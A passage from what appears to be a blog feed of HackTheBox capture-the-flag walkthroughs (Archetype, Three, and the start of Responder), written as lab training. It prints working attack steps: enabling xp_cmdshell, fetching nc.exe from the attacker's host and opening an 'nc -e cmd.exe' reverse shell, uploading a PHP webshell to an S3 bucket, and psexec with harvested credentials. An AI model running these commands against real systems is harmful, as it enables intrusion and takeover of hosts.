class="hljs-literal">-security-mode</span>: |   <span class="hljs-number">3</span>:<span class="hljs-number">1</span>:<span class="hljs-number">1</span>: |_    Message signing enabled but not required|_c<span class="hljs-built_in">lock-skew</span>: mean: <span class="hljs-number">1</span>h24m00s, deviation: <span class="hljs-number">3</span>h07m51s, median: <span class="hljs-number">0</span>sService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">71.19</span> seconds</code></pre><p> Which TCP port is hosting a database server? </p><ul><li>1433</li></ul><p> What is the name of the non-Administrative share available over SMB? </p><pre><code class="hljs powershell">┌──(kali㉿kali)-[~]└─<span class="hljs-variable">$</span> smbclient <span class="hljs-literal">-L</span> //<span class="hljs-number">10.129</span>.<span class="hljs-number">95.187</span> <span class="hljs-literal">-N</span></code></pre><p><img src="/../archetype_img/1.png" alt="alt text"></p><ul><li>backups</li></ul><p> What is the password identified in the file on the SMB share? </p><p>Log in with smbclient:</p><pre><code class="hljs powershell">┌──(kali㉿kali)-[~]└─<span class="hljs-variable">$</span> smbclient //<span class="hljs-number">10.129</span>.<span class="hljs-number">95.187</span>/backups <span class="hljs-literal">-N</span> <span class="hljs-literal">-m</span> SMB2</code></pre><p><img src="/../archetype_img/2.png" alt="alt text"></p><pre><code class="hljs powershell">┌──(kali㉿kali)-[~/<span class="hljs-type">Downloads</span>]└─<span class="hljs-variable">$</span> <span class="hljs-built_in">cat</span> prod.dtsConfig &lt;DTSConfiguration&gt;    &lt;DTSConfigurationHeading&gt;        &lt;DTSConfigurationFileInfo GeneratedBy=<span class="hljs-string">&quot;...&quot;</span> GeneratedFromPackageName=<span class="hljs-string">&quot;...&quot;</span> GeneratedFromPackageID=<span class="hljs-string">&quot;...&quot;</span> GeneratedDate=<span class="hljs-string">&quot;20.1.2019 10:01:34&quot;</span>/&gt;    &lt;/DTSConfigurationHeading&gt;    &lt;Configuration ConfiguredType=<span class="hljs-string">&quot;Property&quot;</span> Path=<span class="hljs-string">&quot;\Package.Connections[Destination].Properties[ConnectionString]&quot;</span> ValueType=<span class="hljs-string">&quot;String&quot;</span>&gt;        &lt;ConfiguredValue&gt;<span class="hljs-keyword">Data</span> Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.<span class="hljs-number">1</span>;Persist Security Info=True;Auto Translate=False;&lt;/ConfiguredValue&gt;    &lt;/Configuration&gt;&lt;/DTSConfiguration&gt;</code></pre><p>Password: M3g4c0rp123</p><p>User : Archetype&#x2F;sql_svc</p><p>Answer:</p><ul><li>M3g4c0rp123</li></ul><p> What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server? </p><p><img src="/../archetype_img/3.png" alt="alt text"></p><ul><li>mssqlclient.py</li></ul><p> What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell? </p><p><img src="/../archetype_img/4.png" alt="alt text"></p><ul><li>xp_cmdshell</li></ul><p> What script can be used in order to search possible paths to escalate privileges on Windows hosts? </p><ul><li>winpeas (linpeas for windows)</li></ul><p>Download this tool and install the requirements:</p><p><a href="https://github.com/fortra/impacket">https://github.com/fortra/impacket</a></p><pre><code class="hljs powershell">git clone https://github.com/fortra/impacket<span class="hljs-built_in">cd</span> impacketpip3 install <span class="hljs-literal">-r</span> requirements.txtpython3 setup.py install</code></pre><p>Use <code>mssqlclient</code> to authenticate:</p><pre><code class="hljs powershell">┌──(kali㉿kali)-[~/…/<span class="hljs-type">Workspace</span>/<span class="hljs-type">HTB</span>/<span class="hljs-type">starting</span>/<span class="hljs-type">impacket</span>]└─<span class="hljs-variable">$</span> python3 examples/mssqlclient.py Archetype/sql_svc@<span class="hljs-number">10.129</span>.<span class="hljs-number">95.187</span> <span class="hljs-literal">-windows-auth</span></code></pre><p><img src="/../archetype_img/5.png" alt="alt text"></p><p>First let’s check our roles on the server:</p><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> is_srvrolemember(<span class="hljs-string">&#x27;sysadmin&#x27;</span>);</code></pre><p><img src="/../archetype_img/6.png" alt="alt text"></p><p>Return’s 1 which means that is true.</p><p><strong>Step 1: Enable <code>xp_cmdshell</code></strong></p><p><strong>Enable Advanced Options:</strong></p><pre><code class="hljs sql"><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span>;RECONFIGURE;</code></pre><p><strong>Enable <code>xp_cmdshell</code>:</strong></p><pre><code class="hljs sql"><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-number">1</span>;RECONFIGURE;</code></pre><p><img src="/../archetype_img/7.png" alt="alt text"></p><p><strong>Step 2: Execute Commands Using <code>xp_cmdshell</code></strong></p><p>Now that <strong><code>xp_cmdshell</code></strong> is enabled, you can execute commands. Here are a few examples:</p><p><strong>Listing Directory Contents:</strong></p><pre><code class="hljs sql"><span class="hljs-keyword">EXEC</span> xp_cmdshell <span class="hljs-string">&#x27;dir C:\&#x27;</span>;</code></pre><pre><code class="hljs powershell">SQL (ARCHETYPE\sql_svc  dbo@master)&gt; EXEC xp_cmdshell <span class="hljs-string">&#x27;dir C:\&#x27;</span>;</code></pre><p><img src="/../archetype_img/8.png" alt="alt text"></p><p>Good, so we have a shell now but let’s try to get our own stable shell</p><p><a href="https://pentesting.academy/p/how-to-get-a-xp-cmdshell-reverse-shell-in-a-windows-server-a9696041a785">https://pentesting.academy/p/how-to-get-a-xp-cmdshell-reverse-shell-in-a-windows-server-a9696041a785</a></p><h2 id="xp-cmdshell-with-nc"><a href="#xp-cmdshell-with-nc" class="headerlink" title="xp_cmdshell with nc"></a>xp_cmdshell with nc</h2><p>First we have to download nc.exe :<a href="https://github.com/int0x33/nc.exe/blob/master/nc.exe">https://github.com/int0x33/nc.exe/blob/master/nc.exe</a> </p><p>on our local machine</p><p>Set up a python server on our own machine in order to send the file to the attacked machine</p><pre><code class="hljs powershell">python3 <span class="hljs-literal">-m</span> http.server</code></pre><p>And run this command in the shell we have:</p><pre><code class="hljs powershell">xp_cmdshell <span class="hljs-string">&quot;powershell.exe wget http://10.10.14.211:8000/nc.exe -OutFile c:\\Users\Public\\nc.exe&quot;</span></code></pre><p><img src="/../archetype_img/9.png" alt="alt text"></p><p>We can see the file has been uploaded succesfully :</p><p><img src="/../archetype_img/10.png" alt="alt text"></p><p>Set up a netcat listener on our machine :</p><pre><code class="hljs powershell">┌──(kali㉿kali)-[~/…/<span class="hljs-type">Workspace</span>/<span class="hljs-type">HTB</span>/<span class="hljs-type">starting</span>/<span class="hljs-type">nc.exe</span>]└─<span class="hljs-variable">$</span> nc <span class="hljs-literal">-lvnp</span> <span class="hljs-number">4444</span></code></pre><p>And run this where we have shell access:</p><pre><code class="hljs powershell">xp_cmdshell <span class="hljs-string">&quot;c:\\Users\Public\\nc.exe -e cmd.exe 10.10.14.211 4444&quot;</span></code></pre><p>Aaaaand ladies and gentleman’s</p><ul><li><p>We have our own stable shell now</p><p>  <img src="/../archetype_img/11.png" alt="alt text"></p></li></ul><pre><code class="hljs powershell"><span class="hljs-built_in">cd</span> Users<span class="hljs-built_in">cd</span> sql_svc<span class="hljs-built_in">cd</span> Desktop<span class="hljs-built_in">type</span> user.txt</code></pre><p><img src="/../archetype_img/12.png" alt="alt text"></p><p>User Password: <code>3e7b102e78218e935bf3f4951fec21a3</code></p><h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><p>Download WinPeas to our machine and open a http.server:</p><pre><code class="hljs powershell">python3 <span class="hljs-literal">-m</span> http.server</code></pre><p>Run this command on the active shell we got to copy the winPEASx64.exe:</p><pre><code class="hljs powershell">powershell.exe <span class="hljs-built_in">wget</span> http://<span class="hljs-number">10.10</span>.<span class="hljs-number">14.211</span>:<span class="hljs-number">8000</span>/winPEASx64.exe <span class="hljs-literal">-OutFile</span> c:\\Users\Public\\winPEASx64.exe</code></pre><p>And simply run by typing <code>winPEASx64.exe</code></p><p><img src="/../archetype_img/13.png" alt="alt text"></p><p><img src="/../archetype_img/14.png" alt="alt text"></p><p>Go into that file:</p><pre><code class="hljs powershell">C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine&gt;<span class="hljs-built_in">type</span> ConsoleHost_history.txt<span class="hljs-built_in">type</span> ConsoleHost_history.txtnet.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!<span class="hljs-keyword">exit</span></code></pre><p>user:administrator</p><p>pass:MEGACORP_4dm1n!!</p><p> What file contains the administrator’s password? </p><ul><li>Consolehost_history.txt</li></ul><p>Now we can use psexec to log in as administrator and get the flag:</p><pre><code class="hljs powershell">┌──(kali㉿kali)-[~/<span class="hljs-type">Desktop</span>/<span class="hljs-type">Workspace</span>/<span class="hljs-type">HTB</span>/<span class="hljs-type">starting</span>]└─<span class="hljs-variable">$</span> python3 /home/kali/Desktop/Workspace/HTB/starting/impacket/examples/psexec.py administrator@<span class="hljs-number">10.129</span>.<span class="hljs-number">5.68</span>  Impacket v0.<span class="hljs-number">12.0</span>.dev1+<span class="hljs-number">20240517.91610</span>.<span class="hljs-number">269</span>ce698 - Copyright <span class="hljs-number">2023</span> FortraPassword:[*] Requesting shares on <span class="hljs-number">10.129</span>.<span class="hljs-number">5.68</span>.....[*] Found writable share ADMIN<span class="hljs-variable">$</span>[*] Uploading file aWUNhKDQ.exe[*] Opening SVCManager on <span class="hljs-number">10.129</span>.<span class="hljs-number">5.68</span>.....[*] Creating service TuyN on <span class="hljs-number">10.129</span>.<span class="hljs-number">5.68</span>.....[*] Starting service TuyN.....[!] Press help <span class="hljs-keyword">for</span> extra shell commandsMicrosoft Windows [<span class="hljs-type">Version</span> <span class="hljs-number">10.0</span><span class="hljs-type">.17763.2061</span>](c) <span class="hljs-number">2018</span> Microsoft Corporation. All rights reserved.C:\Windows\system32&gt; <span class="hljs-built_in">cd</span> / C:\&gt; <span class="hljs-built_in">cd</span> Users C:\Users&gt; <span class="hljs-built_in">cd</span> Administrator C:\Users\Administrator&gt; <span class="hljs-built_in">cd</span> Desktop C:\Users\Administrator\Desktop&gt; <span class="hljs-built_in">dir</span> Volume <span class="hljs-keyword">in</span> drive C has no label. Volume Serial Number is <span class="hljs-number">9565</span><span class="hljs-literal">-0B4F</span> Directory of C:\Users\Administrator\Desktop<span class="hljs-number">07</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">02</span>:<span class="hljs-number">30</span> AM    &lt;<span class="hljs-built_in">DIR</span>&gt;          .<span class="hljs-number">07</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">02</span>:<span class="hljs-number">30</span> AM    &lt;<span class="hljs-built_in">DIR</span>&gt;          ..<span class="hljs-number">02</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2020</span>  <span class="hljs-number">07</span>:<span class="hljs-number">36</span> AM                <span class="hljs-number">32</span> root.txt               <span class="hljs-number">1</span> File(s)             <span class="hljs-number">32</span> bytes               <span class="hljs-number">2</span> <span class="hljs-built_in">Dir</span>(s)  <span class="hljs-number">10</span>,<span class="hljs-number">694</span>,<span class="hljs-number">463</span>,<span class="hljs-number">488</span> bytes freeC:\Users\Administrator\Desktop&gt; <span class="hljs-built_in">type</span> root.txtb91ccec3305e98240082d4474b848528</code></pre><p>Flag: <code>b91ccec3305e98240082d4474b848528</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Very Easy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Three</title>
      <link href="/2024/05/22/Three/"/>
      <url>/2024/05/22/Three/</url>
      
        <content type="html"><![CDATA[<p><img src="/../Three_img/49fa1274ca631fd870e9feca35b7d7c2.webp" alt="alt text"></p><h2 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h2><p>Machine IP: 10.129.227.248</p><h3 id="NMAP-Scanning"><a href="#NMAP-Scanning" class="headerlink" title="NMAP Scanning:"></a>NMAP Scanning:</h3><pre><code class="hljs powershell">┌──(kali㉿kali)-[~/<span class="hljs-type">Desktop</span>/<span class="hljs-type">Workspace</span>/<span class="hljs-type">HTB</span>/<span class="hljs-type">starting</span>]└─<span class="hljs-variable">$</span> sudo nmap <span class="hljs-literal">-p-</span> <span class="hljs-literal">-sS</span> <span class="hljs-literal">--min-rate</span> <span class="hljs-number">5000</span> <span class="hljs-literal">--open</span> <span class="hljs-literal">-T5</span> <span class="hljs-literal">-vvv</span> <span class="hljs-literal">-Pn</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">227.248</span>[<span class="hljs-type">sudo</span>] password <span class="hljs-keyword">for</span> kali: Host discovery disabled (<span class="hljs-literal">-Pn</span>). All addresses will be marked <span class="hljs-string">&#x27;up&#x27;</span> and scan times may be slower.Starting Nmap <span class="hljs-number">7.94</span>SVN ( https://nmap.org ) at <span class="hljs-number">2024</span><span class="hljs-literal">-05-20</span> <span class="hljs-number">19</span>:<span class="hljs-number">12</span> EDTInitiating Parallel DNS resolution of <span class="hljs-number">1</span> host. at <span class="hljs-number">19</span>:<span class="hljs-number">12</span>Completed Parallel DNS resolution of <span class="hljs-number">1</span> host. at <span class="hljs-number">19</span>:<span class="hljs-number">12</span>, <span class="hljs-number">0.13</span>s elapsedDNS resolution of <span class="hljs-number">1</span> IPs took <span class="hljs-number">0.13</span>s. Mode: Async [<span class="hljs-comment">#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]</span><span class="hljs-type">Initiating</span> <span class="hljs-type">SYN</span> <span class="hljs-type">Stealth</span> <span class="hljs-type">Scan</span> <span class="hljs-type">at</span> <span class="hljs-number">19</span>:<span class="hljs-number">12</span><span class="hljs-type">Scanning</span> <span class="hljs-number">10.129</span><span class="hljs-type">.227.248</span> [<span class="hljs-number">65535</span> <span class="hljs-type">ports</span>]<span class="hljs-type">Discovered</span> <span class="hljs-type">open</span> <span class="hljs-type">port</span> <span class="hljs-number">80</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">on</span> <span class="hljs-number">10.129</span><span class="hljs-type">.227.248</span><span class="hljs-type">Discovered</span> <span class="hljs-type">open</span> <span class="hljs-type">port</span> <span class="hljs-number">22</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">on</span> <span class="hljs-number">10.129</span><span class="hljs-type">.227.248</span><span class="hljs-type">Completed</span> <span class="hljs-type">SYN</span> <span class="hljs-type">Stealth</span> <span class="hljs-type">Scan</span> <span class="hljs-type">at</span> <span class="hljs-number">19</span>:<span class="hljs-number">12</span>, <span class="hljs-number">17.75</span><span class="hljs-type">s</span> <span class="hljs-type">elapsed</span> (<span class="hljs-number">65535</span> <span class="hljs-type">total</span> <span class="hljs-type">ports</span>)<span class="hljs-type">Nmap</span> <span class="hljs-type">scan</span> <span class="hljs-type">report</span> <span class="hljs-type">for</span> <span class="hljs-number">10.129</span><span class="hljs-type">.227.248</span><span class="hljs-type">Host</span> <span class="hljs-type">is</span> <span class="hljs-type">up</span>, <span class="hljs-type">received</span> <span class="hljs-type">user</span>-<span class="hljs-type">set</span> (<span class="hljs-number">0.081</span><span class="hljs-type">s</span> <span class="hljs-type">latency</span>)<span class="hljs-type">.</span><span class="hljs-type">Scanned</span> <span class="hljs-type">at</span> <span class="hljs-number">2024</span>-<span class="hljs-number">05</span>-<span class="hljs-number">20</span> <span class="hljs-number">19</span>:<span class="hljs-number">12</span>:<span class="hljs-number">18</span> <span class="hljs-type">EDT</span> <span class="hljs-type">for</span> <span class="hljs-number">18</span><span class="hljs-type">s</span><span class="hljs-type">Not</span> <span class="hljs-type">shown</span>: <span class="hljs-number">56509</span> <span class="hljs-type">closed</span> <span class="hljs-type">tcp</span> <span class="hljs-type">ports</span> (<span class="hljs-type">reset</span>), <span class="hljs-number">9024</span> <span class="hljs-type">filtered</span> <span class="hljs-type">tcp</span> <span class="hljs-type">ports</span> (<span class="hljs-type">no</span>-<span class="hljs-type">response</span>)<span class="hljs-type">Some</span> <span class="hljs-type">closed</span> <span class="hljs-type">ports</span> <span class="hljs-type">may</span> <span class="hljs-type">be</span> <span class="hljs-type">reported</span> <span class="hljs-type">as</span> <span class="hljs-type">filtered</span> <span class="hljs-type">due</span> <span class="hljs-type">to</span> --<span class="hljs-type">defeat</span>-<span class="hljs-type">rst</span>-<span class="hljs-type">ratelimit</span><span class="hljs-type">PORT</span>   <span class="hljs-type">STATE</span> <span class="hljs-type">SERVICE</span> <span class="hljs-type">REASON</span><span class="hljs-number">22</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">open</span>  <span class="hljs-type">ssh</span>     <span class="hljs-type">syn</span>-<span class="hljs-type">ack</span> <span class="hljs-type">ttl</span> <span class="hljs-number">63</span><span class="hljs-number">80</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">open</span>  <span class="hljs-type">http</span>    <span class="hljs-type">syn</span>-<span class="hljs-type">ack</span> <span class="hljs-type">ttl</span> <span class="hljs-number">63</span><span class="hljs-type">Read</span> <span class="hljs-type">data</span> <span class="hljs-type">files</span> <span class="hljs-type">from</span>: /<span class="hljs-type">usr</span>/<span class="hljs-type">bin</span>/<span class="hljs-type">..</span>/<span class="hljs-type">share</span>/<span class="hljs-type">nmap</span><span class="hljs-type">Nmap</span> <span class="hljs-type">done</span>: <span class="hljs-number">1</span> <span class="hljs-type">IP</span> <span class="hljs-type">address</span> (<span class="hljs-number">1</span> <span class="hljs-type">host</span> <span class="hljs-type">up</span>) <span class="hljs-type">scanned</span> <span class="hljs-type">in</span> <span class="hljs-number">17.99</span> <span class="hljs-type">seconds</span>           <span class="hljs-type">Raw</span> <span class="hljs-type">packets</span> <span class="hljs-type">sent</span>: <span class="hljs-number">87952</span> (<span class="hljs-number">3.870</span><span class="hljs-type">MB</span>) | <span class="hljs-type">Rcvd</span>: <span class="hljs-number">65148</span> (<span class="hljs-number">2.606</span><span class="hljs-type">MB</span>)</code></pre><h3 id="FULL-NMAP-Scanning"><a href="#FULL-NMAP-Scanning" class="headerlink" title="FULL NMAP Scanning:"></a>FULL NMAP Scanning:</h3><pre><code class="hljs powershell">┌──(kali㉿kali)-[~/<span class="hljs-type">Desktop</span>/<span class="hljs-type">Workspace</span>/<span class="hljs-type">HTB</span>/<span class="hljs-type">starting</span>]└─<span class="hljs-variable">$</span> nmap <span class="hljs-literal">-A</span> <span class="hljs-literal">-sC</span> <span class="hljs-literal">-sV</span> <span class="hljs-literal">-p22</span>,<span class="hljs-number">80</span>  <span class="hljs-number">10.129</span>.<span class="hljs-number">227.248</span> <span class="hljs-literal">-Pn</span>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https://nmap.org ) at <span class="hljs-number">2024</span><span class="hljs-literal">-05-20</span> <span class="hljs-number">19</span>:<span class="hljs-number">12</span> EDTNmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">227.248</span>Host is up (<span class="hljs-number">0.14</span>s latency).PORT   STATE SERVICE VERSION<span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">7.6</span>p1 Ubuntu <span class="hljs-number">4</span>ubuntu0.<span class="hljs-number">7</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)| ssh<span class="hljs-literal">-hostkey</span>: |   <span class="hljs-number">2048</span> <span class="hljs-number">17</span>:<span class="hljs-number">8</span>b:d4:<span class="hljs-number">25</span>:<span class="hljs-number">45</span>:<span class="hljs-number">2</span>a:<span class="hljs-number">20</span>:b8:<span class="hljs-number">79</span>:f8:e2:<span class="hljs-number">58</span>:d7:<span class="hljs-number">8</span>e:<span class="hljs-number">79</span>:f4 (RSA)|   <span class="hljs-number">256</span> e6:<span class="hljs-number">0</span>f:<span class="hljs-number">1</span>a:f6:<span class="hljs-number">32</span>:<span class="hljs-number">8</span>a:<span class="hljs-number">40</span>:ef:<span class="hljs-number">2</span>d:a7:<span class="hljs-number">3</span>b:<span class="hljs-number">22</span>:d1:c7:<span class="hljs-number">14</span>:fa (ECDSA)|_  <span class="hljs-number">256</span> <span class="hljs-number">2</span>d:e1:<span class="hljs-number">87</span>:<span class="hljs-number">41</span>:<span class="hljs-number">75</span>:f3:<span class="hljs-number">91</span>:<span class="hljs-number">54</span>:<span class="hljs-number">41</span>:<span class="hljs-number">16</span>:b7:<span class="hljs-number">2</span>b:<span class="hljs-number">80</span>:c6:<span class="hljs-number">8</span>f:<span class="hljs-number">05</span> (ED25519)<span class="hljs-number">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2.4</span>.<span class="hljs-number">29</span> ((Ubuntu))|_http<span class="hljs-literal">-title</span>: The Toppers|_http<span class="hljs-literal">-server-header</span>: Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">29</span> (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">23.35</span> seconds</code></pre><p> How many TCP ports are open? </p><ul><li>2</li></ul><p> What is the domain of the email address provided in the “Contact” section of the website? </p><p><img src="/../Three_img/1.png" alt="alt text"></p><ul><li>thetoppers.htb</li></ul><p> In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames? </p><ul><li>&#x2F;etc&#x2F;hosts</li></ul><p> Which sub-domain is discovered during further enumeration? </p><h2 id="FUZZING"><a href="#FUZZING" class="headerlink" title="FUZZING"></a>FUZZING</h2><h3 id="WFUZZ"><a href="#WFUZZ" class="headerlink" title="WFUZZ"></a>WFUZZ</h3><ul><li>command used: <pre><code class="hljs bash">wfuzz -c -w /home/kali/Desktop/Workspace/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb -H <span class="hljs-string">&quot;Host: FUZZ.thetoppers.htb&quot;</span> --hl 1234</code></pre></li></ul><p><img src="/../Three_img/2.png" alt="alt text"></p><p>All the responses are 200 OK there is only one  404 so let’s see if this is the one :</p><p>Add it to <code>/etc/hosts</code></p><p><img src="/../Three_img/3.png" alt="alt text"></p><p><img src="/../Three_img/4.png" alt="alt text"></p><p>Answer: </p><ul><li>s3.thetoppers.htb</li></ul><p> Which service is running on the discovered sub-domain?</p><p><img src="/../Three_img/5.png" alt="alt text"></p><p><img src="/../Three_img/6.png" alt="alt text"></p><ul><li>Amazon s3</li></ul><p> Which command line utility can be used to interact with the service running on the discovered sub-domain? </p><p><img src="/../Three_img/7.png" alt="alt text"></p><ul><li>AWSCLI</li></ul><p> Which command is used to set up the AWS CLI installation? </p><p><img src="/../Three_img/8.png" alt="alt text"></p><ul><li>aws configure</li></ul><p> What is the command used by the above utility to list all of the S3 buckets? </p><ul><li>aws s3 ls</li></ul><p> This server is configured to run files written in what web scripting language? </p><pre><code class="hljs powershell">sudo apt install awscli</code></pre><p>Configure aws</p><p><img src="/../Three_img/9.png" alt="alt text"></p><p>Try to connect to the s3 bucket</p><p><img src="/../Three_img/10.png" alt="alt text"></p><p>Answer:</p><ul><li>php</li></ul><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>Submit root flag:</p><p>We’re gonna use this github manual to upload a simple webshell:</p><p><a href="https://gist.github.com/nicolasdao/edc30b5ad57f1e2147cf3b63bd76f6a9">AWS CLI manual. Keywords: aws cli aws-cli s3</a></p><p><img src="/../Three_img/11.png" alt="alt text"></p><p>Upload a WebShell:</p><pre><code class="hljs powershell">┌──(kali㉿kali)-[~/<span class="hljs-type">Desktop</span>/<span class="hljs-type">Workspace</span>/<span class="hljs-type">HTB</span>/<span class="hljs-type">starting</span>]└─<span class="hljs-variable">$</span> aws s3 <span class="hljs-built_in">cp</span> shell.php <span class="hljs-literal">--endpoint-url</span>=http://s3.thetoppers.htb s3://thetoppers.htb</code></pre><p>Check if the file has been uploaded:</p><p><img src="/../Three_img/12.png" alt="alt text"></p><p>Now we use curl to get the flag:</p><pre><code class="hljs powershell">┌──(kali㉿kali)-[~]└─<span class="hljs-variable">$</span> <span class="hljs-built_in">curl</span> <span class="hljs-string">&quot;http://thetoppers.htb/shell.php?cmd=whoami&quot;</span><span class="hljs-comment"># Take input from the url paramter. shell.php?cmd=whoami</span>www<span class="hljs-literal">-data</span>┌──(kali㉿kali)-[~]└─<span class="hljs-variable">$</span> <span class="hljs-built_in">curl</span> <span class="hljs-string">&quot;http://thetoppers.htb/shell.php?cmd=ls+../&quot;</span><span class="hljs-comment"># Take input from the url paramter. shell.php?cmd=whoami</span>flag.txthtml┌──(kali㉿kali)-[~]└─<span class="hljs-variable">$</span> <span class="hljs-built_in">curl</span> <span class="hljs-string">&quot;http://thetoppers.htb/shell.php?cmd=cat+../flag.txt&quot;</span><span class="hljs-comment"># Take input from the url paramter. shell.php?cmd=whoami</span>a980d99281a28d638ac68b9bf9453c2b</code></pre><p>FLAG : <code>a980d99281a28d638ac68b9bf9453c2b</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Very Easy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Responder</title>
      <link href="/2024/05/22/Responder/"/>
      <url>/2024/05/22/Responder/</url>
      
        <content type="html"><![CDATA[<p><img src="/../RESPONDER_IMG/responder.png" alt="alt text"></p><h2 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h2><p>Machine IP: 10.129.158.118</p><h3 id="NMAP-Scanning"><a href="#NMAP-Scanning" class="headerlink" title="NMAP Scanning:"></a>NMAP Scanning:</h3><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads]└─$ sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn 10.129.158.118[sudo] password <span class="hljs-keyword">for</span> kali: Host discovery disabled (-Pn). All addresses will be marked <span class="hljs-string">&#x27;up&#x27;</span> and scan <span class="hljs-built_in">times</span> may be slower.Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-17 14:28 EDTInitiating Parallel DNS resolution of 1 host. at 14:28Completed Parallel DNS resolution of 1 host. at 14:28, 0.16s elapsedDNS resolution of 1 IPs took 0.16s. Mode: Async [<span class="hljs-comment">#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]</span>Initiating SYN Stealth Scan at 14:28Scanning 10.129.158.118 [65535 ports]Discovered open port 80/tcp on 10.129.158.118Discovered open port 5985/tcp on 10.129.158.118Discovered open port 7680/tcp on 10.129.158.118Completed SYN Stealth Scan at 14:29, 26.40s elapsed (65535 total ports)Nmap scan report <span class="hljs-keyword">for</span> 10.129.158.118Host is up, received user-set (0.063s latency).Scanned at 2024-05-17 14:28:43 EDT <span class="hljs-keyword">for</span> 26sNot shown: 65532 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT     STATE SERVICE   REASON80/tcp   open  http      syn-ack ttl 1275985/tcp open  wsman     syn-ack ttl 1277680/tcp open  pando-pub syn-ack ttl 127Read data files from: /usr/bin/../share/nmapNmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 26.67 seconds           Raw packets sent: 131085 (5.768MB) | Rcvd: 20 (872B)</code></pre><h3 id="FULL-NMAP-Scanning"><a href="#FULL-NMAP-Scanning" class="headerlink" title="FULL NMAP Scanning:"></a>FULL NMAP Scanning:</h3><pre><code class="hljs powershell">┌──(kali㉿kali)-[~/<span class="hljs-type">Desktop</span>/<span class="hljs-type">Workspace</span>/<span class="hljs-type">HTB</span>/<span class="hljs-type">starting</span>]└─<span class="hljs-variable">$</span> nmap <span class="hljs-literal">-A</span> <span class="hljs-literal">-sC</span> <span class="hljs-literal">-sV</span> <span class="hljs-literal">-p80</span>,<span class="hljs-number">5985</span>,<span class="hljs-number">7680</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">95.234</span> <span class="hljs-literal">-Pn</span>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https://nmap.org ) at <span class="hljs-number">2024</span><span class="hljs-literal">-05-20</span> <span class="hljs-number">18</span>:<span class="hljs-number">21</span> EDTNmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">95.234</span>Host is up (<span class="hljs-number">0.067</span>s latency).PORT     STATE SERVICE    VERSION<span class="hljs-number">80</span>/tcp   open  http       Apache httpd <span class="hljs-number">2.4</span>.<span class="hljs-number">52</span> ((Win64) OpenSSL/<span class="hljs-number">1.1</span>.<span class="hljs-number">1</span>m PHP/<span class="hljs-number">8.1</span>.<span class="hljs-number">1</span>)|_http<span class="hljs-literal">-title</span>: Site doesn<span class="hljs-string">&#x27;t have a title (text/html; charset=UTF-8).</span><span class="hljs-string">|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1</span><span class="hljs-string">5985/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><span class="hljs-string">|_http-title: Not Found</span><span class="hljs-string">|_http-server-header: Microsoft-HTTPAPI/2.0</span><span class="hljs-string">7680/tcp open  pando-pub?</span><span class="hljs-string">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><span class="hljs-string"></span><span class="hljs-string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 21.44 seconds</span></code></pre><p>When visiting the web service using the 